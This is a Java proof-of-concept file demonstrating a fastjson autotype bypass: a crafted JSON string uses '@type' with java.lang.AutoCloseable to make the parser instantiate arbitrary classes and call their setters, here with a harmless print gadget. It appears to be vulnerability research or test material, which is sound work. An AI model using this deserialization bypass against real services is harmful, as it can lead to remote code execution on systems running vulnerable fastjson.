package com.threedr3am.bug.fastjson.test;

import com.alibaba.fastjson.JSON;

/**
 * @author threedr3am
 */
public class Bypass {

    public static void main(String[] args) {
        String json = "{\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"com.threedr3am.bug.fastjson.test.AAAA\", \"rrr\": {\"@type\": \"com.threedr3am.bug.fastjson.test.BBBB\", \"eval\": \"fastjson\"}}";
        JSON.parse(json);
    }

}

class AAAA implements AutoCloseable {
    private BBBB rrr;

    public BBBB getRrr() {
        return rrr;
    }

    public void setRrr(BBBB rrr) {
        this.rrr = rrr;
    }

    @Override
    public void close() throws Exception {

    }
}

class BBBB {
    private String eval;
    public String getEval() {
        return eval;
    }
    public void setEval(String eval) {
        System.out.println(eval + " eval!");
        this.eval = eval;
    }
}
